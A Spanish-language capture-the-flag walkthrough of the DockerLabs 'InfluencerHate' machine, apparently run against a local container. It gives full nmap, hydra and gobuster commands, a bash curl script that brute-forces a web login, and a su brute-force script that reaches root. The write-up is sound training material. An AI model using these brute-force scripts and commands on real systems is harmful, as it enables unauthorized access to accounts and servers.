---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# InfluencerHate DockerLabs (Easy)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip influencerhate.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh influencerhate.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-12 03:12 EDT
Nmap scan report for packer.pw (172.17.0.2)
Host is up (0.00021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 86:ba:77:96:38:4e:54:22:d9:09:f1:03:17:bd:52:43 (ECDSA)
|_  256 28:b4:8b:66:08:67:77:f9:b0:f6:c2:94:58:34:dd:47 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Zona restringida
|_http-title: 401 Unauthorized
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
```

Veremos que tendremos un puerto `80` en el que aloja una pagina web, si entramos en dicha pagina veremos que nos pide unas credenciales en forma de una alerta, por lo que vamos a realizar un poco de fuerza bruta a ver si encontramos suerte.

Antes para saber a que nos estamos enfrentando vamos a capturar la peticion para ver que tipo de autenticacion es, abriremos `BurpSuite`, configurandolo en el mismo puerto para que intercepte las peticiones, vamos a loguearnos con `admin:admin` estando a la escucha con `BurpSuite` capturara la peticion y veremos lo siguiente:

```
GET / HTTP/1.1 
Host: 172.17.0.2 
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 
Accept-Language: en-US,en;q=0.5 
Accept-Encoding: gzip, deflate, br 
Connection: keep-alive 
Upgrade-Insecure-Requests: 1 
If-Modified-Since: Thu, 10 Jul 2025 15:00:29 GMT 
If-None-Match: "162e-63994744d428b-gzip" 
Priority: u=0, i 
Authorization: Basic YWRtaW46YWRtaW4=

```

Veremos que esta utilizando especificamente `Basic` codificado en `Base64` si lo decodificamos veremos esto:

```shell
echo 'YWRtaW46YWRtaW4=' | base64 -d
```

Info:

```
admin:admin
```

Veremos que ciertamente es lo que pusimos, por lo que ahora si vamos a probar a realizar fuerza bruta con `hydra`.

## Hydra

Despues de un rato, estaba claro que iba a tardar muchisimo en intentar encontrar credenciales con dos diccionarios diferentes con `hydra`, por ello me descargue en `SecList` un diccionario en la que vienen usuarios y passwords por defecto para probar con el parametro `-C` de `hydra`.

URL = [Download List Defaults Credentials](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt)

```shell
hydra -C ftp-betterdefaultpasslist.txt <IP> http-get / -t 64 -I -e nsr
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-12 03:35:11
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 264 login tries, ~5 tries per task
[DATA] attacking http-get://172.17.0.2:80/
[80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
The session file ./hydra.restore was written. Type "hydra -R" to resume session.
```

Con esto veremos que ha funcionado, por lo que vamos a probarlas en el `login` web a ver si nos deja.

```
User: httpadmin
Pass: fhttpadmin
```

Una vez logueados veremos la pagina de `apache2` normal, por lo que no veremos nada interesante, vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

Vamos a capturar de nuevo la peticion de `BurpSuite` para ver como funciona la cabecera una vez autenticado y poderlo poner en `Gobuster` con el `-H`.

```
GET /login.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Vemos que que en la parte de `Authorization` es lo que nos interesa, por lo que copiaremos esa parte de ahi y la pegaremos en `Gobuster` quedando el comando asi:

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x php,txt,html -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" -s 200 --status-codes-blacklist "" -k -r -t 50
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:               http://172.17.0.2/
[+] Method:            GET
[+] Threads:           50
[+] Wordlist:          /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:      200
[+] User Agent:        gobuster/3.6
[+] Extensions:        html,php,txt
[+] Follow Redirect:   true
[+] Timeout:           10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/login.php            (Status: 200) [Size: 2798]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos que hay un recurso llamado `login.php`, vamos a ver que contiene visitandolo.

## Escalate user balutin

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-12 095627.png" alt=""><figcaption></figcaption></figure>

Entrando en el mismo veremos otro `login` el cual vamos a realizar un poco de `fuzzing` e intentar realizar un poco de `fuerza bruta`.

Vamos a crearnos un script en `bash` para automatizar el ataque de esta forma:

> forcePass.sh

```bash
#!/bin/bash

URL="http://<IP>/login.php"
USER="admin"
WORDLIST="/usr/share/wordlists/rockyou.txt"
AUTH_HEADER="Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4="
FAIL_STRING="Credenciales incorrectas."

while read -r PASS; do
    echo "[*] Probando contraseña: $PASS"
    RESPONSE=$(curl -s -X POST "$URL" \
      -H "$AUTH_HEADER" \
      -d "username=$USER&password=$PASS")

    if [[ "$RESPONSE" != *"$FAIL_STRING"* ]]; then
        echo "[+] ¡Contraseña encontrada!: $PASS"
        exit 0
    fi
done < "$WORDLIST"

echo "[-] No se encontró la contraseña correcta en el wordlist."
exit 1
```

Vamos a probar con el usuario `admin` de primeras, el cual va a funcionar por suerte, lo ejecutaremos de esta forma:

```shell
chmod +x forcePass.sh
bash forcePass.sh
```

Info:

```
.................................<RESTO_CODIGO>....................................
[*] Probando contraseña: chocolate
[+] ¡Contraseña encontrada!: chocolate
```

Veremos que ha funcionado, por lo que vamos a probarlas en la web.

Una vez que las probemos veremos esto otro:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-07-12 100912.png" alt=""><figcaption></figcaption></figure>

Vemos que nos esta dando un usuario, por lo que vamos a realizar fuerza bruta de nuevo esta vez por `SSH` directamente con dicho usuario.

### Hydra

```shell
hydra -l balutin -P <WORDLIST> ssh://<IP> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-12 04:11:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: balutin   password: estrella
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 10 final worker threads did not complete until end.
[ERROR] 10 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-12 04:11:28
```

Veremos que ha funcionado, por lo que ahora si nos vamos a conectar por `SSH`.

### SSH

```shell
ssh balutin@<IP>
```

Metemos como contraseña `estrella` y veremos que estaremos dentro.

## Escalate Privileges

Despues de un rato, no veremos nada, por lo que vamos a probar a realizar de nuevo fuerza bruta con el usuario `root`, utilizando `su` de esta forma.

Antes nos pasaremos el `rockyou.txt` desde nuestro `host` ponemos esto:

```shell
scp /usr/share/wordlists/rockyou.txt balutin@172.17.0.2:/tmp/
```

Metemos como contraseña `estrella` y veremos que se cargo correctamente, si lo comprobamos veremos que ha funcioando.

Ahora nos vamos a descargar el script que vamos a utilizar de aqui.

URL = [Download suBruteforce.sh](https://github.com/D1se0/suBruteforce/blob/main/suBruteforceBash/suBruteforce.sh)

Una vez que lo hayamos pasado tambien a `/tmp` vamos a darle permisos de ejecuccion y ejecutarlo de esta forma.

```shell
cd /tmp
chmod +x suBruteforce.sh
./suBruteforce.sh root rockyou.txt
```

Info:

```
[+] Contraseña encontrada para el usuario root:rockyou
```

Veremos que ha funcionado, por lo que vamos a probarlas.

```shell
su root
```

Metemos como contraseña `rockyou` y veremos que estaremos dentro.

Info:

```
root@4332e7afbc43:/tmp# whoami
root
```

Por lo que vemos ya seremos el usuario `root`, por lo que habremos terminado la maquina.
